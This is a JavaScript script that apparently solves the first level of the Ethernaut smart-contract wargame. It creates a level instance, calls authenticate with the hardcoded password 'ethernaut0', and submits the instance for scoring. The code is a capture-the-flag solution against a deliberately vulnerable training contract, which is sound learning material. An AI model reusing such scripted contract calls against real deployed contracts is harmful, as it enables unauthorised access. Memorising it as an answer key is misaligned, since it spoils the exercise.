const { web3 } = require('../utils/getWeb3');
const { mainAddress, levelAddresses, deployId, submitId } = require('../utils/contractInfo');
const { getAccounts, checkLength, sendTransaction, valueFromLogs, encodeMethodIdWithParameters } = require('../utils/helpers');

var globalValue = {};

const createInstance = async () => {
    console.log('Creating instance..');
    const account = await getAccounts(0);
    globalValue.account = account;
    const levelAddress = levelAddresses[0];
    console.log("deploying....");
    const payload = deployId + '0'.repeat(24) + levelAddress.slice(2);
    checkLength(payload, 74);
    return sendTransaction(payload, mainAddress, account);
};

const initHack = async (password) => {
  console.log('Hacking...');
  console.log('Calling authenticate method');
  console.log('instance address inside initHack', globalValue.instanceAddress);
  const payload = encodeMethodIdWithParameters(
      'authenticate(string)',
      ['string'],
      [password]
  );
  return sendTransaction(payload, globalValue.instanceAddress, globalValue.account);
};

const submitInstance = async (instanceAddress) => {
  console.log('Submitting instance...');
  const payload = submitId + '0'.repeat(24) + instanceAddress.slice(2);
  checkLength(payload, 74);
  const account = await getAccounts(0);
  return sendTransaction(payload, mainAddress, globalValue.account);
};

createInstance()
  .then((receipt) => {
    const rawAddress = valueFromLogs(receipt, 'data');
    const instanceAddress = '0x' + rawAddress.slice(26);
    globalValue.instanceAddress = instanceAddress;
    return initHack('ethernaut0');
  })
  .then(() => {
  return submitInstance(globalValue.instanceAddress);
})
.then((data) => {
  console.log(data);
})
.catch(console.log);
